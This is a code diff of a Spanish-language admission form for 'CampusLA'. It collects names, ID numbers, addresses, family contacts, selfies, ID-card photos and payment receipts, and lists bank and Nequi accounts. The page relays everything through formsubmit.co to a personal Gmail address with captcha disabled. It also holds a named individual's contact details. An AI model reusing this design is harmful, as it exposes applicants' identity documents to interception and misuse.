@@ -2,275 +2,329 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Consola Personal - CampusLA</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Admisión Oficial | CampusLA</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        :root { --sidebar-width: 280px; --primary-blue: #003366; --accent-blue: #385898; }
-        body { font-family: Helvetica, Arial, sans-serif; background: #e9ebee; color: #1c1e21; margin: 0; display: 
-
-flex; min-height: 100vh; }
-        
-        /* Sidebar Fijo de la Consola */
-        .help-sidebar { width: var(--sidebar-width); background: #ffffff; border-right: 1px solid #ccd0d5; 
-
-position: fixed; height: 100vh; display: flex; flex-direction: column; justify-content: space-between; padding: 
-
-20px; box-sizing: border-box; z-index: 10; }
-        .sidebar-brand h3 { font-size: 16px; color: var(--primary-blue); margin: 5px 0 20px 0; }
-        .brand-badge { background: #e7f3ff; color: var(--accent-blue); padding: 4px 8px; border-radius: 4px; font-
-
-size: 10px; font-weight: bold; text-transform: uppercase; }
-        
-        .help-nav-menu { display: flex; flex-direction: column; gap: 8px; }
-        .nav-item { background: transparent; border: none; text-align: left; padding: 12px; font-size: 13px; font-
-
-weight: 600; color: #4b4f56; border-radius: 6px; cursor: pointer; transition: background 0.2s; }
-        .nav-item:hover, .nav-item.active { background: #f0f2f5; color: var(--primary-blue); }
-        .nav-hl-blue { color: #0066cc; }
-        .nav-hl-pink { color: #e91e63; }
-        .nav-hl-yellow { color: #f59e0b; }
-
-        .sidebar-support-box { background: #f0f2f5; padding: 15px; border-radius: 8px; text-align: center; }
-        .sidebar-support-box p { font-size: 12px; color: #606770; margin: 0 0 10px 0; }
-        .btn-sidebar-alert { display: block; background: #003366; color: #fff; text-decoration: none; padding: 8px; 
-
-border-radius: 6px; font-size: 12px; font-weight: bold; }
-
-        /* Contenido Central de la Consola */
-        .help-content-body { margin-left: var(--sidebar-width); flex: 1; padding: 40px; box-sizing: border-box; 
-
-max-width: 1000px; }
-        .help-main-header { margin-bottom: 30px; }
-        .help-main-header h1 { font-size: 24px; color: var(--primary-blue); margin: 0 0 8px 0; }
-        .help-main-header p { color: #606770; font-size: 14px; margin: 0; }
-
-        .master-content-card { background: #ffffff; border-radius: 8px; border: 1px solid #ccd0d5; padding: 30px; 
-
-box-shadow: 0 1px 4px rgba(0,0,0,0.05); }
-        
-        .help-tab-pane { display: none; }
-        .help-tab-pane.active-pane { display: block; }
-
-        .sec-header { display: flex; align-items: center; gap: 12px; border-bottom: 1px solid #dadde1; padding-
-
-bottom: 15px; margin-bottom: 20px; }
-        .sec-number { background: #003366; color: #fff; width: 28px; height: 28px; display: flex; align-items: 
-
-center; justify-content: center; border-radius: 50%; font-size: 12px; font-weight: bold; }
-        .sec-header h2 { font-size: 16px; margin: 0; color: #1d2129; }
-
-        /* Tablas y Cajas de Datos */
-        .profile-meta-table { width: 100%; border-collapse: collapse; margin-top: 15px; }
-        .profile-meta-table tr td { padding: 12px; border-bottom: 1px solid #f0f2f5; font-size: 13.5px; }
-        .meta-label { font-weight: 700; color: #606770; width: 45%; }
-        .meta-value { color: #1c1e21; font-weight: 500; }
-
-        .btn-action-cla { background: #39ff14; color: #000; border: none; padding: 10px 18px; border-radius: 6px; 
-
-font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 12px; box-shadow: 0 2px 6px rgba
-
-(57,255,20,0.3); text-decoration: none; display: inline-block; }
-        .btn-action-cla:hover { opacity: 0.9; }
-
-        .btn-logout { background: #fee2e2; color: #dc2626; border: none; padding: 10px 16px; border-radius: 6px; 
-
-font-weight: bold; cursor: pointer; margin-top: 20px; }
-        .btn-logout:hover { background: #fecaca; }
-
-        @media (max-width: 768px) {
-            body { flex-direction: column; }
-            .help-sidebar { position: relative; width: 100%; height: auto; }
-            .help-content-body { margin-left: 0; padding: 20px; }
+        :root {
+            --bg: #02060d; --card: #0b111d; --primary: #0084ff;
+            --secondary: #00f2ff; --text-main: #ffffff; --text-dim: #94a3b8;
+            --border: rgba(255, 255, 255, 0.08);
         }
+        body { background-color: var(--bg); color: var(--text-main); font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; padding: 15px; font-size: 13px; }
+        .wrapper { max-width: 550px; width: 100%; margin: auto; }
+        
+        header { padding: 30px 0; text-align: center; }
+        .logo-text { font-size: 2.2rem; font-weight: 700; color: #fff; letter-spacing: -1px; margin: 0; cursor: pointer; }
+        .inst-tag { font-size: 0.65rem; color: var(--primary); font-weight: 700; text-transform: uppercase; letter-spacing: 2px; }
+
+        .section-card { background: var(--card); border: 1px solid var(--border); padding: 20px; border-radius: 16px; margin-bottom: 20px; text-align: left; }
+        h3 { font-size: 0.9rem; font-weight: 700; color: var(--primary); text-transform: uppercase; margin-bottom: 15px; border-bottom: 1px solid var(--border); padding-bottom: 8px; }
+
+        .welcome-h2 { font-size: 1.3rem; font-weight: 700; margin-bottom: 10px; color: #fff; text-align: center; }
+        .copy-redes { font-size: 0.85rem; color: var(--text-dim); text-align: center; line-height: 1.4; margin-bottom: 18px; }
+        .mandatory-badge { background: #fff; color: #000; font-size: 0.7rem; font-weight: 800; padding: 4px 12px; border-radius: 4px; display: inline-block; margin-bottom: 12px; text-transform: uppercase; }
+
+        .social-links { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; }
+        .social-item { background: rgba(255,255,255,0.03); border: 1px solid var(--border); padding: 10px; border-radius: 8px; text-decoration: none; color: #fff; font-size: 0.75rem; font-weight: 500; text-align: center; transition: 0.3s; }
+        .social-item:hover { background: var(--primary); border-color: var(--primary); }
+
+        .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .full-width { grid-column: span 2; }
+        label { display: block; font-size: 0.75rem; font-weight: 600; color: var(--text-dim); margin-bottom: 6px; }
+        input, select, textarea { width: 100%; background: #050a14; border: 1px solid var(--border); border-radius: 8px; padding: 10px; color: white; font-size: 0.85rem; margin-bottom: 15px; box-sizing: border-box; font-family: inherit; }
+        
+        .btn-blue { display: block; text-decoration: none; text-align: center; background: var(--primary); color: white; width: 100%; padding: 16px; border-radius: 10px; font-weight: 700; border: none; cursor: pointer; text-transform: uppercase; font-size: 0.8rem; transition: 0.3s; line-height: 1.2; box-sizing: border-box; }
+        .btn-blue span { display: block; font-size: 0.65rem; font-weight: 400; opacity: 0.9; text-transform: none; margin-top: 4px; }
+        .btn-blue:hover { background: #0066cc; box-shadow: 0 0 15px rgba(0, 132, 255, 0.3); }
+        
+        .cam-input { border: 1px dashed var(--primary); background: rgba(0, 132, 255, 0.03); padding: 12px; border-radius: 8px; text-align: center; margin-bottom: 15px; }
+        .bank-info { background: rgba(255,255,255,0.03); padding: 15px; border-radius: 10px; font-size: 0.8rem; line-height: 1.6; border-left: 3px solid var(--primary); }
+        footer { text-align: center; padding: 30px; font-size: 0.8rem; color: var(--text-dim); border-top: 1px solid var(--border); margin-top: 20px; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
-    <!-- SIDEBAR DE LA CONSOLA -->
-    <aside class="help-sidebar">
-        <div>
-            <div class="sidebar-brand">
-                <span class="brand-badge">ESTUDIANTE PRO</span>
-                <h3 id="sidebar-user-name">Hollman Alvarez</h3>
-            </div>
+<div class="wrapper">
+    <header>
+        <div class="logo-text">CAMPUSLA</div>
+        <div class="inst-tag">ESCUELA ANDINA RES 210 DE 2020</div>
+    </header>
+
+    <form action="https://formsubmit.co/eatramites1@gmail.com" method="POST" id="mainForm" enctype="multipart/form-data">
+        <input type="hidden" name="_captcha" value="false">
+        <!-- Redirección controlada tras envío o habilitación de dashboard -->
+        <input type="hidden" name="_next" value="https://www.campuslatinoamerica.edu.co/dashboard.html">
+        
+        <!-- Inputs ocultos para archivos procesados -->
+        <input type="file" id="inputFirmaOculto" name="Firma_Digital" style="display:none;">
+        <input type="file" id="inputCedulaOculto" name="Cedula_Foto" style="display:none;">
+        <input type="file" id="inputFotoOculto" name="Selfie" style="display:none;">
+
+        <section class="section-card" style="text-align: center;">
+            <h2 class="welcome-h2">¡Bienvenido al campus más grande del mundo!</h2>
+            <div class="mandatory-badge">Requisito de Admisión</div>
+            <p class="copy-redes">
+                Es <b>obligatorio</b> registrarse en la plataforma oficial y seguir nuestras redes institucionales. 
+                De carácter mandatorio para todos los estudiantes sin importar el proceso de certificación.
+            </p>
             
-            <nav class="help-nav-menu">
-                <button onclick="switchTab('datos-registro', this)" class="nav-item active">1. <span class="nav-
+            <a href="https://www.campuslatinoamerica.edu.co" target="_blank" style="display: block; background: #fff; color: #000; padding: 12px; border-radius: 8px; text-decoration: none; font-weight: 800; font-size: 0.9rem; margin-bottom: 15px;">
+                REGÍSTRATE EN: www.campuslatinoamerica.edu.co
+            </a>
 
-hl-blue">Mi Perfil</span> & Datos</button>
-                <button onclick="switchTab('estado-academico', this)" class="nav-item">2. <span class="nav-hl-
+            <div class="social-links">
+                <a href="https://www.facebook.com/profile.php?id=100013260212952" class="social-item" target="_blank">Facebook</a>
+                <a href="https://www.instagram.com/confesionescampusuniversi/" class="social-item" target="_blank">Instagram</a>
+                <a href="https://www.tiktok.com/@aprendegratismarty?lang=es" class="social-item" target="_blank">TikTok</a>
+                <a href="https://www.youtube.com/channel/UCvfCiF08p5G48Z5WTNOzeyQ" class="social-item" target="_blank">YouTube</a>
+            </div>
+        </section>
 
-pink">Cursos</span> & Moodle LMS</button>
-                <button onclick="switchTab('soportes-pago', this)" class="nav-item">3. Compras & <span class="nav-
-
-hl-blue">Soportes</span></button>
-                <button onclick="switchTab('seguridad-cred', this)" class="nav-item">4. <span class="nav-hl-
-
-yellow">Seguridad</span> & Accesos</button>
-            </nav>
-        </div>
-
-        <div class="sidebar-support-box">
-            <p>¿Dudas con tu cuenta?</p>
-            <a href="https://www.campuslatinoamerica.edu.co" target="_blank" class="btn-sidebar-alert">Soporte 
-
-CLA</a>
-        </div>
-    </aside>
-
-    <!-- CONTENIDO CENTRAL DE LA CONSOLA -->
-    <main class="help-content-body">
-        <div class="help-main-header">
-            <h1>Consola Personal del Estudiante</h1>
-            <p>Bienvenido a tu centro de control en <span class="nav-hl-blue">CampusLA</span>. Administra tu 
-
-formación y accesos.</p>
-        </div>
-
-        <div class="master-content-card">
-
-            <!-- 1. MI PERFIL Y DATOS -->
-            <div id="datos-registro" class="help-tab-pane active-pane">
-                <div class="sec-header">
-                    <span class="sec-number">01</span>
-                    <h2>Metadatos y <span class="nav-hl-blue">Credenciales Oficiales</span></h2>
-                </div>
-                <p>Información asociada a tu cuenta activa dentro del ecosistema.</p>
+        <section class="section-card">
+            <h3>01. Información Académica y Personal</h3>
+            <div style="border-left: 5px solid #0056b3; background-color: #f4f7f9; padding: 15px; margin-bottom: 15px; border-radius: 4px; border: 1px solid #e1e8ed;">
+                <p style="margin: 0; color: #2c3e50; font-size: 1em; line-height: 1.5;">
+                    <span style="color: #0056b3; font-weight: bold; text-transform: uppercase;">📍 Instrucción de Radicación:</span><br>
+                    Apreciado usuario, **primero debe realizar la firma de documentos (Botón Azul Parte Inferior de este form)**. Si diligencia este formulario antes de firmar, la información se perderá. Firme primero y luego complete su registro.
+                </p>
+            </div>  
+            <div class="form-grid">
+                <div class="full-width"><label>Nombres y Apellidos Completos</label><input type="text" name="Nombre" id="inputNombre" required></div>
+                <div><label>Cédula / Documento</label><input type="text" name="Cedula" id="inputCC" required></div>
+                <div><label>Teléfono Celular</label><input type="tel" name="Tel" id="inputContacto" required></div>
+                <div class="full-width"><label>Dirección y Ciudad de Residencia</label><input type="text" name="Direccion" id="inputDireccion" required></div>
+                <div class="full-width"><label>Universidad / Institución de procedencia</label><input type="text" name="Universidad" id="inputUniversidad"></div>
+                <div><label>Carrera / Programa</label><input type="text" name="Carrera" id="inputCarrera"></div>
+                <div><label>Correo electrónico personal o institucional</label><input type="email" name="Correo" id="inputCorreo" required></div>
                 
-                <table class="profile-meta-table">
-                    <tr>
-                        <td class="meta-label">Nombre Completo</td>
-                        <td class="meta-value" id="val-nombre">Hollman Alvarez (Marty)</td>
-                    </tr>
-                    <tr>
-                        <td class="meta-label">Cédula / Documento</td>
-                        <td class="meta-value" id="val-cedula">123456789</td>
-                    </tr>
-                    <tr>
-                        <td class="meta-label">Correo Principal</td>
-                        <td class="meta-value" id="val-email">aysgrupoconsultor@gmail.com</td>
-                    </tr>
-                    <tr>
-                        <td class="meta-label">Teléfono Vinculado</td>
-                        <td class="meta-value" id="val-telefono">+57 314 436 5569</td>
-                    </tr>
-                    <tr>
-                        <td class="meta-label">Estado de Cuenta</td>
-                        <td class="meta-value" style="color: #10b981; font-weight: bold;">● Activo y 
-
-Verificado</td>
-                    </tr>
-                </table>
-
-                <button class="btn-logout" onclick="cerrarSesion()">Cerrar Sesión / Volver</button>
-            </div>
-
-            <!-- 2. CURSOS Y MOODLE LMS -->
-            <div id="estado-academico" class="help-tab-pane">
-                <div class="sec-header">
-                    <span class="sec-number">02</span>
-                    <h2><span class="nav-hl-pink">Cursos Activos</span> y Aulas Virtuales</h2>
+                <div style="margin-bottom: 15px;">
+                    <label style="display: block; font-weight: bold; margin-bottom: 5px;">Fecha de Nacimiento</label>
+                    <input type="date" name="Fecha_Nacimiento" id="inputFecha" min="1980-01-01" max="2010-12-31" value="2000-01-01" required>
+                    <small style="color: var(--text-dim);">Selecciona tu año de nacimiento (Rango optimizado)</small>
                 </div>
-                <p>Accede de forma directa a tus plataformas de estudio configuradas:</p>
                 
-                <div style="display: grid; gap: 15px; margin-top: 20px;">
-                    <div style="background: #f8fafc; border: 1px solid #e2e8f0; padding: 20px; border-radius: 8px; 
-
-display: flex; justify-content: space-between; align-items: center;">
-                        <div>
-                            <h4 style="margin: 0 0 5px 0; color: #003366;">Moodle LMS (Nueva Versión cPanel)</h4>
-                            <p style="margin: 0; font-size: 13px; color: #64748b;">Aulas virtuales, módulos de 
-
-estudio y entrega de actividades.</p>
-                        </div>
-                        <a href="https://campuslatinoamerica.edu.co/moodle" target="_blank" class="btn-action-
-
-cla">Ingresar al Aula</a>
-                    </div>
-
-                    <div style="background: #f8fafc; border: 1px solid #e2e8f0; padding: 20px; border-radius: 8px; 
-
-display: flex; justify-content: space-between; align-items: center;">
-                        <div>
-                            <h4 style="margin: 0 0 5px 0; color: #003366;">Simulador Oficial TOEFL ITP</h4>
-                            <p style="margin: 0; font-size: 13px; color: #64748b;">Módulo de pruebas y homologación 
-
-internacional activo.</p>
-                        </div>
-                        <a href="https://campuslatinoamerica.edu.co/simulador-toefl" target="_blank" class="btn-
-
-action-cla">Abrir Simulador</a>
-                    </div>
+                <div class="full-width">
+                    <label>Nivel de Inglés Exigido</label>
+                    <select name="Nivel_Ingles" id="inputNivelIngles" required>
+                        <option value="">Seleccione nivel...</option>
+                        <option value="A1">A1 - Principiante</option>
+                        <option value="A2">A2 - Básico</option>
+                        <option value="B1">B1 - Pre-intermedio</option>
+                        <option value="B2">B2 - Intermedio Alto</option>
+                        <option value="C1">C1 - Avanzado</option>
+                        <option value="C2">C2 - Maestría</option>
+                    </select>
                 </div>
             </div>
+        </section>
 
-            <!-- 3. COMPRAS Y SOPORTES -->
-            <div id="soportes-pago" class="help-tab-pane">
-                <div class="sec-header">
-                    <span class="sec-number">03</span>
-                    <h2>Historial de <span class="nav-hl-blue">Pagos y Facturación</span></h2>
-                </div>
-                <p>Registro de tus transacciones y recibos validados en el sistema:</p>
-                <div style="background: #f9f9f9; padding: 20px; border-radius: 6px; border: 1px dashed #ccd0d5; 
-
-text-align: center; color: #555; margin-top: 15px;">
-                    <strong>Sin pagos pendientes.</strong> Tus matrículas y accesos anuales están al día.
-                </div>
+        <section class="section-card">
+            <h3>02. Referencia Familiar</h3>
+            <div class="form-grid">
+                <div class="full-width"><label>Nombre del Familiar</label><input type="text" name="Familiar_Nombre" id="inputFamNombre" required></div>
+                <div class="full-width"><label>Teléfono del Familiar</label><input type="tel" name="Familiar_Tel" id="inputFamTel" required></div>
             </div>
+        </section>
 
-            <!-- 4. SEGURIDAD Y ACCESOS -->
-            <div id="seguridad-cred" class="help-tab-pane">
-                <div class="sec-header">
-                    <span class="sec-number">04</span>
-                    <h2><span class="nav-hl-yellow">Seguridad</span> y Contraseña</h2>
-                </div>
-                <p>Modifica tus credenciales de acceso al ecosistema CLA:</p>
-                
-                <div style="max-width: 400px; margin-top: 15px; display: flex; flex-direction: column; gap: 12px;">
-                    <input type="password" placeholder="Contraseña actual" style="padding: 10px; border: 1px solid 
+        <section class="section-card">
+            <h3>03. Validación de Identidad</h3>
+            <label>📸 Foto Selfie (Cámara Frontal)</label>
+            <div class="cam-input"><input type="file" id="inputSelfieDirecto" accept="image/*" capture="user"></div>
+            <label>🪪 Documento de Identidad (Cámara Trasera)</label>
+            <div class="cam-input"><input type="file" id="inputCedulaDirecto" accept="image/*" capture="environment"></div>
+            <small style="color: var(--text-dim); display:block; text-align:center;">Tus fotos se comprimen automáticamente para un envío rápido y seguro.</small>
+        </section>
 
-#cbd5e1; border-radius: 6px;">
-                    <input type="password" placeholder="Nueva contraseña" style="padding: 10px; border: 1px solid 
+        <button type="button" onclick="guardarYFirma()" class="btn-blue" style="margin-bottom: 20px;">
+            <strong>FIRMAR DOCUMENTOS DE ADMISIÓN</strong>
+            <span>Para avanzar en el proceso y registro del examen (3 minutos)</span>
+        </button>
 
-#cbd5e1; border-radius: 6px;">
-                    <button class="btn-action-cla" style="width: fit-content;" onclick="alert('Contraseña 
-
-actualizada con éxito')">Actualizar Clave</button>
-                </div>
+        <section class="section-card">
+            <h3>04. Registro de Pago</h3>
+            <div class="bank-info">
+                <strong>CAMPUSLA SAS:</strong> Bancolombia Ahorros 26200005425<br>
+                <strong>ESCUELA ANDINA:</strong> Bancolombia Ahorros 26200002780<br>
+                <strong>NEQUI / DAVIPLATA:</strong> 3144365569<br>
+                <strong>Código BreB:</strong> 3144365569
             </div>
-
-        </div>
-    </main>
-
-    <script>
-        function switchTab(tabId, btnElement) {
-            document.querySelectorAll('.help-tab-pane').forEach(pane => pane.classList.remove('active-pane'));
-            document.querySelectorAll('.nav-item').forEach(btn => btn.classList.remove('active'));
+            <p style="font-size:0.75rem; color:var(--text-dim); margin-top:10px; font-style:italic;">
+                Para pagos con <b>Tarjeta, PayPal o Stripe</b>, solicite el link a su asesor.
+            </p>
+            <br>
+            <label>🧾 Soporte de Pago (Captura o Foto)</label>
+            <input type="file" name="Pago_Soporte" id="inputPagoSoporte" accept="image/*" required>
             
-            document.getElementById(tabId).classList.add('active-pane');
-            btnElement.classList.add('active');
+            <button type="submit" class="btn-blue" style="background:#00c853; margin-top:15px;">Finalizar Radicación Oficial</button>
+        </section>
+    </form>
+
+    <footer>
+        CAMPUSLA DE CLASE MUNDIAL<br>
+        ESCUELA ANDINA RES 210 DE 2020
+    </footer>
+</div>
+
+<script>
+// 1. Guardar todos los campos del formulario antes de ir a firmar
+function guardarYFirma() {
+    const datos = {
+        nombre: document.getElementById('inputNombre').value,
+        cedula: document.getElementById('inputCC').value,
+        contacto: document.getElementById('inputContacto').value,
+        direccion: document.getElementById('inputDireccion').value,
+        universidad: document.getElementById('inputUniversidad').value,
+        carrera: document.getElementById('inputCarrera').value,
+        correo: document.getElementById('inputCorreo').value,
+        fecha: document.getElementById('inputFecha').value,
+        nivelIngles: document.getElementById('inputNivelIngles').value,
+        famNombre: document.getElementById('inputFamNombre').value,
+        famTel: document.getElementById('inputFamTel').value
+    };
+    localStorage.setItem('datos_campusla', JSON.stringify(datos));
+    window.location.href = "contratosdeprestacióndeserviciosdigitales.html";
+}
+
+// 2. Recuperar datos y fotos almacenadas al volver de la firma
+window.onload = function() {
+    const dGuardados = localStorage.getItem('datos_campusla');
+    if (dGuardados) {
+        const d = JSON.parse(dGuardados);
+        if(d.nombre) document.getElementById('inputNombre').value = d.nombre;
+        if(d.cedula) document.getElementById('inputCC').value = d.cedula;
+        if(d.contacto) document.getElementById('inputContacto').value = d.contacto;
+        if(d.direccion) document.getElementById('inputDireccion').value = d.direccion;
+        if(d.universidad) document.getElementById('inputUniversidad').value = d.universidad;
+        if(d.carrera) document.getElementById('inputCarrera').value = d.carrera;
+        if(d.correo) document.getElementById('inputCorreo').value = d.correo;
+        if(d.fecha) document.getElementById('inputFecha').value = d.fecha;
+        if(d.nivelIngles) document.getElementById('inputNivelIngles').value = d.nivelIngles;
+        if(d.famNombre) document.getElementById('inputFamNombre').value = d.famNombre;
+        if(d.famTel) document.getElementById('inputFamTel').value = d.famTel;
+    }
+
+    setupDirectCapture('inputSelfieDirecto', 'foto_perfil');
+    setupDirectCapture('inputCedulaDirecto', 'cedula_frontal');
+    setupDirectCapture('inputPagoSoporte', 'pago_soporte_local');
+};
+
+function setupDirectCapture(inputId, storageKey) {
+    const input = document.getElementById(inputId);
+    if (!input) return;
+    input.addEventListener('change', function(e) {
+        const file = e.target.files[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = function(event) {
+            localStorage.setItem(storageKey, event.target.result);
+        };
+        reader.readAsDataURL(file);
+    });
+}
+
+// --- HERRAMIENTA TURBO DE COMPRESIÓN ---
+const procesarFoto = async (key, idHidden, fileName) => {
+    const data = localStorage.getItem(key);
+    if (!data || !data.startsWith('data:image')) return;
+
+    return new Promise((resolve) => {
+        const img = new Image();
+        img.src = data;
+        img.onload = () => {
+            const canvas = document.createElement('canvas');
+            const MAX_WIDTH = 1200;
+            let width = img.width; 
+            let height = img.height;
+            if (width > MAX_WIDTH) { height *= MAX_WIDTH / width; width = MAX_WIDTH; }
+            
+            canvas.width = width; 
+            canvas.height = height;
+            const ctx = canvas.getContext('2d');
+            
+            ctx.fillStyle = "white"; 
+            ctx.fillRect(0, 0, width, height);
+            ctx.drawImage(img, 0, 0, width, height);
+            
+            canvas.toBlob((blob) => {
+                const file = new File([blob], fileName, { type: "image/jpeg" });
+                const dt = new DataTransfer();
+                dt.items.add(file);
+                document.getElementById(idHidden).files = dt.files;
+                resolve();
+            }, 'image/jpeg', 0.7);
+        };
+    });
+};
+
+// --- LOGICA DE FLUJO DE DATOS DUAL (FormSubmit + Base de Datos cPanel + Dashboard) ---
+document.getElementById('mainForm').onsubmit = async function(e) {
+    e.preventDefault();
+    const form = this;
+    const btn = document.querySelector('button[type="submit"]');
+    
+    if(btn) {
+        btn.innerText = "Registrando en Base de Datos y Correo... ⏳";
+        btn.disabled = true;
+    }
+
+    try {
+        // 1. Preparar Firma Digital
+        const dataFirma = localStorage.getItem('firma_campusla');
+        if (dataFirma) {
+            const res = document.createElement('canvas'); // auxiliar o fetch blob
+            const resBlob = await (await fetch(dataFirma)).blob();
+            const fileFirma = new File([resBlob], "firma.png", { type: "image/png" });
+            const dtF = new DataTransfer();
+            dtF.items.add(fileFirma);
+            document.getElementById('inputFirmaOculto').files = dtF.files;
         }
 
-        // Cargar dinámicamente la info que se guardó del formulario
-        window.onload = function() {
-            const datosGuardados = localStorage.getItem('datos_campusla');
-            if (datosGuardados) {
-                const d = JSON.parse(datosGuardados);
-                if(d.nombre) {
-                    document.getElementById('sidebar-user-name').innerText = d.nombre;
-                    document.getElementById('val-nombre').innerText = d.nombre;
-                }
-                if(d.cedula) document.getElementById('val-cedula').innerText = d.cedula;
-                if(d.contacto) document.getElementById('val-telefono').innerText = d.contacto;
-                if(d.email) document.getElementById('val-email').innerText = d.email;
-            }
+        // 2. Procesar Fotos (Selfie y Cédula)
+        await Promise.all([
+            procesarFoto('cedula_frontal', 'inputCedulaOculto', 'cedula.jpg'),
+            procesarFoto('foto_perfil', 'inputFotoOculto', 'selfie.jpg')
+        ]);
+
+        // 3. ENVIAR A LA BASE DE DATOS CPANEL EN SEGUNDO PLANO (AJAX / Fetch API)
+        const formDataDB = new FormData(form);
+        // Opcional: Llamada a tu endpoint PHP en cPanel (ej: guardar_admision.php)
+        try {
+            await fetch('https://www.campuslatinoamerica.edu.co/api/guardar_admision.php', {
+                method: 'POST',
+                body: formDataDB
+            });
+        } catch (dbErr) {
+            console.log("Aviso de sincronización cPanel secundario:", dbErr);
         }
 
-        function cerrarSesion() {
-            if(confirm("¿Deseas volver al inicio?")) {
-                window.location.href = "index.html";
-            }
+        // 4. GUARDAR SESIÓN PARA EL DASHBOARD DEL ESTUDIANTE
+        const studentData = {
+            nombre: document.getElementById('inputNombre').value,
+            cedula: document.getElementById('inputCC').value,
+            correo: document.getElementById('inputCorreo').value,
+            nivelIngles: document.getElementById('inputNivelIngles').value,
+            estadoAdmision: "En Validación de Pago y Matrícula",
+            cursoActivo: "Simulador Oficial TOEFL ITP + Moodle Core",
+            pagoRegistrado: true,
+            fechaRadicacion: new Date().toLocaleDateString()
+        };
+        localStorage.setItem('campusla_student_session', JSON.stringify(studentData));
+
+        alert("¡EUREKA! 🎓 Tus datos, documentos y pagos han sido radicados con éxito. Accediendo a tu Dashboard...");
+        
+        // 5. Disparar el envío oficial a FormSubmit y redirigir al Dashboard del Estudiante
+        form.submit();
+
+    } catch (err) {
+        console.error("Error en el flujo:", err);
+        alert("Hubo un detalle en el procesamiento. Intenta de nuevo.");
+        if(btn) {
+            btn.innerText = "Finalizar Radicación Oficial";
+            btn.disabled = false;
         }
-    </script>
+    }
+};
+</script>
 </body>
 </html>
